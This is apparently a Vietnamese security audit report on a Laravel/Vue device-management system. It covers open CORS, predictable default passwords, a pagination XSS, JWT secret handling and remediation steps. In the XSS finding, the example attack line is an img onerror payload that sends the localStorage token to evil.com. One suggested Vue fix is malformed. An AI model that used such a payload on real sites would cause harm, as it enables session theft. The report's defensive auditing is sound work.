# 🔒 BÁO CÁO KIỂM TRA BẢO MẬT ZERO-TRUST

**Dự án:** Hệ thống Quản lý Thiết bị Laravel  
**Ngày kiểm tra:** 22/01/2026  
**Vai trò kiểm tra:** Chuyên gia Kiểm toán An ninh mạng & Phân tích Mã nguồn  
**Phương pháp:** Zero-Trust, Phân tích Đối kháng

---

## TÓM TẮT TỔNG QUAN

Báo cáo kiểm tra bảo mật toàn diện này đã xem xét toàn bộ mã nguồn (Backend: Laravel/PHP, Frontend: Vue.js) dưới giả định zero-trust. Phân tích bao gồm kiểm tra dependencies, các mẫu thực thi độc hại, quản lý secrets, bảo mật CI/CD và phát hiện rò rỉ dữ liệu.

**Mức độ Rủi ro Tổng thể:** 🟡 **TRUNG BÌNH** (Một số vấn đề nghiêm trọng cần được xử lý ngay lập tức)

---

## 🔴 CÁC LỖ HỔNG NGHIÊM TRỌNG

### 1. **Cấu hình CORS - Mở hoàn toàn**

**File:** `BACKEND/config/cors.php`  
**Dòng:** 20-28  
**Mức độ nghiêm trọng:** 🔴 NGHIÊM TRỌNG

```php
'allowed_methods' => ['*'],
'allowed_origins' => ['*'],
'allowed_headers' => ['*'],
'exposed_headers' => ['*'],
'supports_credentials' => true,
```

**Tác động:**

- **BẤT KỲ domain nào** đều có thể gửi request có xác thực đến API của bạn
- Thông tin xác thực (cookies, auth headers) được gửi cross-origin
- Cho phép tấn công CSRF, chiếm quyền session và đánh cắp dữ liệu
- Kẻ tấn công có thể tạo một trang web độc hại và đánh cắp dữ liệu người dùng

**Kịch bản tấn công:**

1. Kẻ tấn công tạo `evil.com` với JavaScript gọi API của bạn
2. Nạn nhân truy cập `evil.com` trong khi đang đăng nhập vào ứng dụng của bạn
3. Script của kẻ tấn công đọc dữ liệu nạn nhân, thực hiện hành động với tư cách nạn nhân
4. Có thể chiếm quyền tài khoản hoàn toàn

**Khắc phục:**

```php
'allowed_origins' => [
    env('FRONTEND_URL', 'http://localhost:5173'),
    // Thêm URL frontend production
],
'allowed_methods' => ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
'allowed_headers' => ['Content-Type', 'Authorization', 'X-Requested-With'],
'exposed_headers' => [],
```

---

### 2. **Mẫu Mật khẩu Mặc định Yếu**

**Files:**

- `BACKEND/app/Services/UserService.php` (dòng 98-99, 121-122)
- `BACKEND/app/Http/Controllers/Api/Admin/UserController.php` (dòng 58)

**Mức độ nghiêm trọng:** 🔴 NGHIÊM TRỌNG

```php
// UserService.php
$cleanName = sanitizeNameForPassword($user->name);
$data['password'] = bcrypt($cleanName . "@123");

// UserController.php
'password' => bcrypt($request->name . "123"),
```

**Tác động:**

- Mật khẩu có thể dự đoán được cho tất cả người dùng
- "nguyenvana@123" hoặc "nguyenvana123" cho người dùng "Nguyễn Văn A"
- Kẻ tấn công có thể brute-force tài khoản khi biết mẫu
- Có thể xâm nhập hàng loạt tài khoản nếu phát hiện ra mẫu

**Kịch bản tấn công:**

1. Kẻ tấn công lấy được danh sách người dùng (tên/email)
2. Tạo mật khẩu sử dụng cùng logic sanitization
3. Thử đăng nhập tự động thành công
4. Truy cập vào tất cả tài khoản có mật khẩu mặc định

**Khắc phục:**

```php
// Tạo mật khẩu ngẫu nhiên an toàn
use Illuminate\Support\Str;

$randomPassword = Str::random(16); // Hoặc dùng Str::password(12)
$data['password'] = bcrypt($randomPassword);

// Gửi mật khẩu qua kênh bảo mật (email với link reset)
// Bắt buộc đổi mật khẩu lần đầu đăng nhập
```

---

### 3. **Lỗ hổng XSS trong Component Phân trang**

**File:** `FONTEND/src/components/common/Pagination.vue`  
**Dòng:** 6  
**Mức độ nghiêm trọng:** 🔴 NGHIÊM TRỌNG

```vue
<button
  v-html="link.label"
  @click="goTo(link.url)"
```

**Tác động:**

- Render HTML không được sanitize từ dữ liệu backend
- Nếu backend bị xâm nhập hoặc trả về label phân trang độc hại
- Vector tấn công XSS được lưu trữ
- Có thể đánh cắp token, dữ liệu session, thực hiện hành động với tư cách người dùng

**Kịch bản tấn công:**

1. Kẻ tấn công tìm cách inject dữ liệu phân trang độc hại
2. Label chứa: `<img src=x onerror="fetch('https://evil.com?token='+localStorage.getItem('token'))">`
3. Người dùng xem trang có phân trang
4. Token bị đánh cắp về server của kẻ tấn công

**Khắc phục:**

```vue
<!-- Sử dụng text interpolation thay thế -->
<button
  {{ link.label }}
  @click="goTo(link.url)"
```

Hoặc sanitize với DOMPurify nếu cần HTML:

```javascript
import DOMPurify from 'dompurify';
// Trong computed hoặc method
sanitizedLabel() {
  return DOMPurify.sanitize(this.link.label);
}
```

---

### 4. **JWT Secret Không Được Bắt buộc**

**File:** `BACKEND/config/jwt.php`  
**Dòng:** 28  
**Mức độ nghiêm trọng:** 🔴 NGHIÊM TRỌNG

```php
'secret' => env('JWT_SECRET'),
```

**Vấn đề:**

- Không có validation JWT_SECRET tồn tại
- Nếu `.env` bị thiếu hoặc JWT_SECRET rỗng, token có thể được ký với chuỗi rỗng
- Cho phép giả mạo token

**Cần kiểm tra:**
Kiểm tra xem `JWT_SECRET` đã được set trong file `.env` chưa (bị chặn bởi gitignore, nhưng phải verify trong production)

**Khắc phục:**

```php
'secret' => env('JWT_SECRET') ?: throw new \RuntimeException('JWT_SECRET phải được thiết lập'),
```

Thêm vào checklist triển khai:

```bash
php artisan jwt:secret  # Tạo nếu chưa tồn tại
```

---

## 🟠 CÁC MỤC ĐÁNG NGHI

### 5. **Câu truy vấn SQL Thô - Nguy cơ SQL Injection**

**Files:**

- `BACKEND/app/Services/Dashboard/AdminDashboardService.php` (dòng 42-252)
- `BACKEND/app/Services/Dashboard/StaffDashboardService.php`
- `BACKEND/app/Services/Dashboard/BorrowerDashboardService.php`

**Mức độ nghiêm trọng:** 🟠 CAO

**Code hiện tại:**

```php
$trends = DB::select("
    SELECT
        DATE_FORMAT(created_at, '%Y-%m') as month,
        COUNT(*) as total_borrows
    FROM borrows
    WHERE created_at >= DATE_SUB(NOW(), INTERVAL 6 MONTH)
    GROUP BY DATE_FORMAT(created_at, '%Y-%m')
");
```

**Đánh giá:**

- Hiện đang sử dụng query tĩnh (không có input từ user)
- **AN TOÀN** trong implementation hiện tại
- **RỦI RO:** Nếu developer tương lai thêm tham số mà không binding đúng cách

**Bằng chứng:**
Tất cả các query đã được xem xét đều không có tham số. Không có mối đe dọa trực tiếp, nhưng là thực hành kém.

**Khuyến nghị:**
Chuyển sang Query Builder để đảm bảo tính nhất quán:

```php
$trends = DB::table('borrows')
    ->selectRaw("DATE_FORMAT(created_at, '%Y-%m') as month, COUNT(*) as total_borrows")
    ->where('created_at', '>=', now()->subMonths(6))
    ->groupByRaw("DATE_FORMAT(created_at, '%Y-%m')")
    ->get();
```

---

### 6. **localStorage cho Dữ liệu Nhạy cảm**

**File:** `FONTEND/src/stores/authStore.js`  
**Dòng:** 8-9, 16-24  
**Mức độ nghiêm trọng:** 🟠 TRUNG BÌNH-CAO

```javascript
const user = ref(JSON.parse(localStorage.getItem("user")) || null);
const token = ref(localStorage.getItem("token") || null);
```

**Vấn đề:**

- JWT token trong localStorage dễ bị tấn công XSS
- Nếu có bất kỳ XSS nào, kẻ tấn công có thể đánh cắp token
- Không có bảo vệ HttpOnly (không giống cookie)

**Tại sao đáng nghi:**

- Kết hợp với lỗ hổng XSS (#3), đây là chuỗi nghiêm trọng
- Bất kỳ script injection nào cũng có thể đánh cắp token

**Khuyến nghị:**

1. **Ngắn hạn:** Đảm bảo tất cả lỗ hổng XSS được vá
2. **Dài hạn:** Cân nhắc httpOnly cookies cho token:

```javascript
// Backend set httpOnly cookie
return response()->json($data)->cookie(
    'auth_token', $token, 60, '/', null, true, true
);

// Frontend: axios tự động gửi cookies
// Không cần localStorage
```

---

### 7. **Thiếu Validation Input trên Role Middleware**

**File:** `BACKEND/app/Http/Middleware/RoleMiddleware.php`  
**Dòng:** 18-26  
**Mức độ nghiêm trọng:** 🟠 TRUNG BÌNH

```php
public function handle(Request $request, Closure $next, ...$roles): Response
{
    try {
        $user = auth('api')->user();

        if (!in_array($user->role, $roles)) {
            return response()->json(['error' => 'Forbidden'], 403);
        }
    } catch (\Exception $e) {
        return response()->json(['message' => 'Unauthorized'], 401);
    }

    return $next($request);
}
```

**Vấn đề:**

- Bắt TẤT CẢ exception, che giấu các vấn đề bảo mật tiềm ẩn
- Không kiểm tra null trên `$user` trước khi truy cập `->role`
- Thông báo lỗi chung không rò rỉ thông tin (tốt), nhưng không có logging

**Khuyến nghị:**

```php
public function handle(Request $request, Closure $next, ...$roles): Response
{
    $user = auth('api')->user();

    if (!$user) {
        Log::warning('Cố gắng truy cập không xác thực', [
            'ip' => $request->ip(),
            'route' => $request->path()
        ]);
        return response()->json(['message' => 'Unauthorized'], 401);
    }

    if (!in_array($user->role, $roles)) {
        Log::warning('Truy cập role không được phép', [
            'user_id' => $user->id,
            'required_roles' => $roles,
            'user_role' => $user->role
        ]);
        return response()->json(['error' => 'Forbidden'], 403);
    }

    return $next($request);
}
```

---

## 🟡 LỖ HỔNG / THỰC HÀNH YẾU

### 8. **Không có Rate Limiting trên Xác thực**

**File:** `BACKEND/routes/api.php`  
**Dòng:** 164-166  
**Mức độ nghiêm trọng:** 🟡 TRUNG BÌNH

```php
Route::prefix('auth')->group(function () {
    Route::post('/login', [AuthController::class, 'login']);
    Route::post('/register', [AuthController::class, 'register']);
```

**Vấn đề:**

- Không có rate limiting trên endpoint login
- Cho phép tấn công brute-force
- Kết hợp với mẫu mật khẩu yếu (#2), đây là nghiêm trọng

**Khuyến nghị:**

```php
Route::prefix('auth')->group(function () {
    Route::post('/login', [AuthController::class, 'login'])
        ->middleware('throttle:5,1'); // 5 lần thử mỗi phút
    Route::post('/register', [AuthController::class, 'register'])
        ->middleware('throttle:3,1');
```

---

### 9. **Thiếu CSRF Protection**

**Mức độ nghiêm trọng:** 🟡 TRUNG BÌNH

**Đánh giá:**

- API sử dụng JWT (stateless), CSRF protection không áp dụng
- **NHƯNG:** Nếu `supports_credentials: true` trong CORS (#1), cookies có thể được sử dụng
- Nếu cookies được sử dụng, CSRF là bắt buộc

**Trạng thái hiện tại:** Không dễ bị tấn công (chỉ JWT)  
**Rủi ro:** Trở nên dễ bị tấn công nếu thêm cookies mà không có CSRF token

**Khuyến nghị:**

- Giữ xác thực chỉ JWT
- Nếu thêm cookies, implement CSRF protection

---

### 10. **Không có Security Headers**

**Mức độ nghiêm trọng:** 🟡 TRUNG BÌNH

**Headers bị thiếu:**

- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy`

**Khuyến nghị:**
Thêm middleware hoặc cấu hình web server:

```php
// app/Http/Middleware/SecurityHeaders.php
public function handle($request, Closure $next)
{
    $response = $next($request);

    $response->headers->set('X-Content-Type-Options', 'nosniff');
    $response->headers->set('X-Frame-Options', 'DENY');
    $response->headers->set('X-XSS-Protection', '1; mode=block');
    $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');

    return $response;
}
```

---

### 11. **Kiểm tra Dependencies**

#### Backend (PHP/Composer)

**Đã phân tích:** `composer.json` và `composer.lock`

✅ **SẠCH - Không Tìm thấy Vấn đề Nghiêm trọng**

**Dependencies:**

- `laravel/framework: ^12.0` - Phiên bản major mới nhất ✅
- `tymon/jwt-auth: ^2.2` - Được duy trì, uy tín ✅
- `maatwebsite/excel: ^3.1` - Phổ biến, được duy trì tốt ✅
- `barryvdh/laravel-dompdf: ^3.1` - Package Laravel đáng tin cậy ✅
- `cloudinary-labs/cloudinary-laravel: ^3.0` - Package Cloudinary chính thức ✅
- `spatie/laravel-activitylog: ^4.10` - Rất uy tín ✅
- `pusher/pusher-php-server: ^7.2` - SDK Pusher chính thức ✅

**Ghi chú:**

- Tất cả package từ nguồn uy tín
- Không phát hiện typosquatting
- Không có git+ URL hoặc tarball trực tiếp
- Ràng buộc phiên bản hợp lý

**Khuyến nghị:**

```bash
# Kiểm tra dependency thường xuyên
composer audit
composer outdated
```

#### Frontend (JavaScript/npm)

**Đã phân tích:** `FONTEND/package.json`

✅ **SẠCH - Không Tìm thấy Vấn đề Nghiêm trọng**

**Dependencies:**

- `vue: ^3.5.18` - Stable mới nhất ✅
- `vue-router: ^4.5.1` - Package Vue chính thức ✅
- `pinia: ^3.0.4` - Quản lý state Vue chính thức ✅
- `axios: ^1.12.2` - Được sử dụng rộng rãi, được duy trì ✅
- `flowbite: ^3.1.2` - Thư viện UI uy tín ✅
- `chart.js: ^4.5.1` - Thư viện biểu đồ phổ biến ✅
- `pusher-js: ^8.4.0` - Client Pusher chính thức ✅

**Ghi chú:**

- Tất cả package đều nổi tiếng và được duy trì
- Không có package đáng ngờ hoặc mơ hồ
- Phiên bản hiện tại

**Khuyến nghị:**

```bash
# Kiểm tra thường xuyên
npm audit
npm outdated
```

---

### 12. **Không Phát hiện Mã Độc hại**

**Đã quét:**

- `eval()` / `exec()` / `shell_exec()` - ❌ Không tìm thấy trong code ứng dụng
- `base64_decode()` - ❌ Không tìm thấy
- `unserialize()` - ❌ Không tìm thấy
- `file_get_contents()` / `file_put_contents()` - ❌ Không tìm thấy trong app code
- Dynamic imports / `new Function()` - ❌ Không tìm thấy
- Code obfuscated - ❌ Không phát hiện

**Kết luận:** Không có bằng chứng về backdoor, malware, hoặc mã độc hại bị obfuscate.

---

### 13. **Quản lý Secrets**

**✅ THỰC HÀNH TỐT ĐÃ QUAN SÁT:**

- File `.env` được gitignore đúng cách
- `.env.example` được cung cấp không có secrets
- Không tìm thấy thông tin xác thực hardcode trong code
- JWT secret được load từ environment

**⚠️ KHUYẾN NGHỊ:**

1. **Kiểm tra Production `.env`:**
   - Đảm bảo `JWT_SECRET` được set và mạnh
   - Kiểm tra `APP_KEY` đã được generate
   - Xác minh thông tin database credentials an toàn

2. **Thêm vào checklist triển khai:**

```bash
# Tạo secrets nếu chưa tồn tại
php artisan key:generate
php artisan jwt:secret

# Xác minh các biến env quan trọng
php artisan tinker
>>> env('JWT_SECRET') !== null  // Phải là true
>>> env('APP_KEY') !== null     // Phải là true
```

3. **Cân nhắc quản lý secrets:**
   - Sử dụng AWS Secrets Manager / Azure Key Vault cho production
   - Rotate JWT secrets định kỳ

---

## ✅ KẾ HOẠCH KHẮC PHỤC

### Ưu tiên 1: NGAY LẬP TỨC (Triển khai trong 24 giờ)

1. **Sửa Cấu hình CORS**
   - File: `BACKEND/config/cors.php`
   - Thay đổi: Giới hạn `allowed_origins` cho các domain cụ thể
   - Test: Xác minh frontend vẫn hoạt động, domain không được phép bị chặn

2. **Sửa XSS trong Pagination**
   - File: `FONTEND/src/components/common/Pagination.vue`
   - Thay đổi: Thay `v-html` bằng text interpolation
   - Test: Xác minh pagination hiển thị đúng

3. **Thêm Rate Limiting**
   - File: `BACKEND/routes/api.php`
   - Thay đổi: Thêm throttle middleware vào auth routes
   - Test: Xác minh các lần thử đăng nhập bị giới hạn

### Ưu tiên 2: CAO (Triển khai trong 1 tuần)

4. **Sửa Tạo Mật khẩu**
   - Files: `UserService.php`, `UserController.php`
   - Thay đổi: Tạo mật khẩu ngẫu nhiên, bắt buộc reset lần đầu đăng nhập
   - Migration: Reset tất cả mật khẩu mặc định hiện có

5. **Thêm Security Headers**
   - Tạo: Middleware `SecurityHeaders`
   - Áp dụng: Cho tất cả routes
   - Test: Xác minh headers trong browser dev tools

6. **Xác minh JWT Secret**
   - Kiểm tra: Production `.env` có JWT_SECRET mạnh
   - Thêm: Runtime validation trong `config/jwt.php`

### Ưu tiên 3: TRUNG BÌNH (Triển khai trong 1 tháng)

7. **Chuyển Raw SQL sang Query Builder**
   - Files: Tất cả Dashboard services
   - Thay đổi: Sử dụng Laravel Query Builder
   - Test: Xác minh thống kê dashboard không thay đổi

8. **Thêm Security Logging**
   - File: `RoleMiddleware.php`
   - Thay đổi: Log các lần thử truy cập không được phép
   - Monitor: Thiết lập cảnh báo cho hoạt động đáng ngờ

9. **Implement Token Refresh Strategy**
   - Cân nhắc: Access token ngắn hạn (15 phút)
   - Implement: Refresh token rotation
   - Lợi ích: Giới hạn thiệt hại nếu token bị đánh cắp

### Ưu tiên 4: LIÊN TỤC

10. **Kiểm tra Dependencies**

```bash
# Hàng tuần
composer audit
npm audit

# Hàng tháng
composer outdated
npm outdated
```

11. **Code Reviews**

- Tất cả PR phải được review về bảo mật
- Sử dụng checklist từ báo cáo này

12. **Penetration Testing**

- Đánh giá bảo mật bên ngoài hàng quý
- Penetration test đầy đủ hàng năm

---

## 🛠️ CÔNG CỤ KHUYẾN NGHỊ

### SAST (Phân tích Tĩnh)

```bash
# PHP
composer require --dev phpstan/phpstan
composer require --dev vimeo/psalm

# JavaScript
npm install --save-dev eslint eslint-plugin-security
```

### Quét Dependencies

```bash
# Tự động
composer audit
npm audit

# Nâng cao
npm install -g snyk
snyk test
```

### Quét Secrets

```bash
# Pre-commit hook
npm install --save-dev @commitlint/cli
# Thêm git-secrets hoặc truffleHog
```

### Bảo vệ Runtime

- **WAF:** Cloudflare, AWS WAF
- **Monitoring:** Sentry, LogRocket
- **SIEM:** Splunk, ELK Stack

---

## 📋 CHECKLIST XÁC MINH

Sau khi implement các bản sửa, xác minh:

- [ ] CORS chỉ cho phép các origin đáng tin cậy
- [ ] Lỗ hổng XSS đã được vá (pagination)
- [ ] Rate limiting hoạt động trên auth endpoints
- [ ] Mật khẩu được tạo ngẫu nhiên
- [ ] Security headers có trong responses
- [ ] JWT_SECRET được set và mạnh
- [ ] Không có secrets trong git history
- [ ] Dependencies được cập nhật
- [ ] `composer audit` không hiển thị lỗ hổng
- [ ] `npm audit` không hiển thị vấn đề critical/high
- [ ] Logging ghi lại các sự kiện bảo mật
- [ ] Cảnh báo monitoring được cấu hình

---

## 🎯 KẾT LUẬN

**Đánh giá Tổng thể:** Mã nguồn cho thấy **nền tảng bảo mật tốt** nhưng có **một số cấu hình sai nghiêm trọng** cần được xử lý ngay lập tức.

**Phát hiện Tích cực:**

- ✅ Không phát hiện malware hoặc backdoor
- ✅ Dependencies từ nguồn uy tín
- ✅ Secrets được loại trừ khỏi version control đúng cách
- ✅ JWT authentication được implement đúng
- ✅ Kiểm soát truy cập dựa trên role đã có

**Vấn đề Nghiêm trọng:**

- 🔴 Cấu hình sai CORS (mở hoàn toàn)
- 🔴 Mẫu tạo mật khẩu yếu
- 🔴 Lỗ hổng XSS trong pagination
- 🔴 Thiếu validation JWT secret

**Mức độ Rủi ro Sau Khắc phục:** 🟢 THẤP (nếu tất cả mục Ưu tiên 1 & 2 được xử lý)

**Thời gian Khắc phục Ước tính:**

- Ưu tiên 1: 4-6 giờ
- Ưu tiên 2: 2-3 ngày
- Ưu tiên 3: 1-2 tuần

---

## 📞 BƯỚC TIẾP THEO

1. **Xem xét báo cáo này** với team phát triển
2. **Tạo tickets** cho mỗi mục khắc phục
3. **Implement các bản sửa Ưu tiên 1** ngay lập tức
4. **Lên lịch security review** sau khi triển khai các bản sửa
5. **Thiết lập thực hành bảo mật** cho phát triển liên tục

**Cần làm rõ hoặc có câu hỏi?** Đánh dấu các phần cụ thể để thảo luận.

---

**Báo cáo Được Tạo:** 22/01/2026  
**Kiểm toán viên:** Chuyên gia Kiểm toán An ninh mạng Cấp cao (Chế độ Zero-Trust)  
**Phương pháp:** Phân tích mã nguồn toàn diện, phân tích dependency, mô hình hóa mối đe dọa
